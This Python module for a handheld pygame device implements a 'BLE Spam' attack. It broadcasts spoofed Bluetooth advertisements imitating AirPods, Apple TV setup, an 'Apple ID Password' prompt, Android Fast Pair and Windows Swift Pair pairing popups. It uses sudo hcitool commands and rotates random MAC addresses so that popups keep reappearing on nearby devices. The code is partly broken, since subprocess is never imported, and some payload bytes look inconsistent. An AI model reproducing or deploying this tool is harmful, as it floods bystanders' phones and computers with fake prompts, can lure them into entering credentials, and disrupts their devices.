"""BLE Spam — Advanced spoofing for Apple/Android/Windows pairing popups."""
from __future__ import annotations

import os
import socket
import struct
import threading
import time
import random
from typing import TYPE_CHECKING

import pygame
from bigbox import theme
from bigbox.events import Button, ButtonEvent

if TYPE_CHECKING:
    from bigbox.app import App


# BLE Advertisement Packets (AppleJuice, Fast Pair, Swift Pair)
# Data format: [Length] [Type=0xFF (Manufacturer Specific)] [Company ID] [Payload]
PROFILES = [
    ("AirPods Pro", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("AirPods Max", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Powerbeats Pro", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Apple TV Setup", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Apple ID Password", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Android Fast Pair", b"\x06\x00\x03\x02\x2d\xfe\x06\x16\x2d\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Windows Swift Pair", b"\x1e\xff\x06\x00\x03\x00\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Kitchen Sink (All)", b"ALL"),
]


class BLESpamView:
    def __init__(self) -> None:
        self.dismissed = False
        self.running = False
        self.cursor = 0
        self.error_msg = ""
        self.packets_sent = 0
        self.iface_idx = 0
        self.interfaces = ["hci0", "hci1"]
        
        self._stop_event = threading.Event()
        self._spam_thread: threading.Thread | None = None
        
        self.title_font = pygame.font.Font(None, 36)
        self.body_font = pygame.font.Font(None, 24)

    def handle(self, ev: ButtonEvent, ctx: App) -> None:
        if not ev.pressed: return

        if ev.button is Button.B:
            self._stop()
            self.dismissed = True
        elif ev.button is Button.UP and not self.running:
            self.cursor = (self.cursor - 1) % len(PROFILES)
        elif ev.button is Button.DOWN and not self.running:
            self.cursor = (self.cursor + 1) % len(PROFILES)
        elif ev.button is Button.X and not self.running:
            self.iface_idx = (self.iface_idx + 1) % len(self.interfaces)
        elif ev.button is Button.A:
            if self.running:
                self._stop()
            else:
                self._start()

    def _start(self):
        self.running = True
        self.error_msg = ""
        self.packets_sent = 0
        self._stop_event.clear()
        self._spam_thread = threading.Thread(target=self._spam_loop, daemon=True)
        self._spam_thread.start()

    def _stop(self):
        self._stop_event.set()
        if self._spam_thread:
            self._spam_thread.join(timeout=1.0)
        self.running = False

    def _spam_loop(self):
        try:
            iface = self.interfaces[self.iface_idx]
            # 1. Bring interface up and stop advertising
            subprocess.run(["sudo", "hciconfig", iface, "up"], capture_output=True)
            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
            time.sleep(0.1)

            # 2. Set Advertising Parameters (20ms interval, non-connectable)
            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0006", "20", "00", "20", "00", "03", "00", "00", "00", "00", "00", "00", "00", "00", "00", "07", "00"], capture_output=True)

            while not self._stop_event.is_set():
                # Randomize MAC every 50 packets to keep popups fresh
                if self.packets_sent % 50 == 0:
                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
                    mac = [random.randint(0, 255) for _ in range(6)]
                    mac[0] |= 0xC0 # Static Random requirement
                    mac_str = " ".join(f"{b:02x}" for b in mac)
                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0005"] + mac_str.split(), capture_output=True)
                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)

                # Select data
                _, profile_data = PROFILES[self.cursor]
                if profile_data == b"ALL":
                    actual_profiles = [p for p in PROFILES if p[1] != b"ALL"]
                    profile_data = random.choice(actual_profiles)[1]

                # 3. Set Advertising Data
                # Convert bytes to hex string for hcitool
                hex_data = " ".join(f"{b:02x}" for b in profile_data)
                # Pad to 31 bytes
                pad_count = 31 - len(profile_data)
                if pad_count > 0:
                    hex_data += " " + " ".join(["00"] * pad_count)
                
                # Length byte (e.g., 1e for 30 bytes of data)
                len_hex = f"{len(profile_data):02x}"
                
                cmd = ["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0008", len_hex] + hex_data.split()
                subprocess.run(cmd, capture_output=True)
                
                # Re-enable advertising to ensure the update sticks
                subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
                
                self.packets_sent += 1
                time.sleep(0.1)

            # Cleanup
            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)

        except Exception as e:
            self.error_msg = f"Shell Error: {e}"
            self.running = False

    def _hci_send_cmd(self, sock, ogf, ocf, data):
        pass # No longer used but kept to avoid errors elsewhere if any

    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)
        
        title = self.title_font.render("BLE SPAM :: ULTIMATE_SPOOF", True, theme.ACCENT)
        surf.blit(title, (theme.PADDING, theme.PADDING))

        status_text = f"STATUS: ATTACKING ({self.packets_sent})" if self.running else "STATUS: READY"
        status_color = theme.ERR if self.running else theme.FG
        s_surf = self.body_font.render(status_text, True, status_color)
        surf.blit(s_surf, (theme.PADDING, 60))

        iface_text = f"IFACE: {self.interfaces[self.iface_idx]}"
        if_surf = self.body_font.render(iface_text, True, theme.ACCENT)
        surf.blit(if_surf, (theme.SCREEN_W - theme.PADDING - if_surf.get_width(), 60))

        if self.error_msg:
            e_surf = self.body_font.render(self.error_msg, True, theme.ERR)
            surf.blit(e_surf, (theme.PADDING, 90))

        # Visual indicator
        if self.running:
            scan_x = (int(time.time() * 400) % (theme.SCREEN_W - 40)) + 20
            pygame.draw.line(surf, theme.ACCENT, (scan_x, 100), (scan_x, 110), 4)

        # Profile List
        list_y = 120
        for i, (name, _) in enumerate(PROFILES):
            y = list_y + i * 30
            if y > theme.SCREEN_H - 80: break
            
            color = theme.ACCENT if i == self.cursor else theme.FG_DIM
            if i == self.cursor and not self.running:
                pygame.draw.rect(surf, theme.SELECTION_BG, (theme.PADDING, y-4, 300, 26), border_radius=4)
            
            p_surf = self.body_font.render(f"[{'*' if self.running and i == self.cursor else ' '}] {name}", True, color)
            surf.blit(p_surf, (theme.PADDING + 10, y))

        hint = self.body_font.render("A: Toggle Attack  X: Cycle Iface  B: Back", True, theme.FG_DIM)
        surf.blit(hint, (theme.PADDING, theme.SCREEN_H - 30))
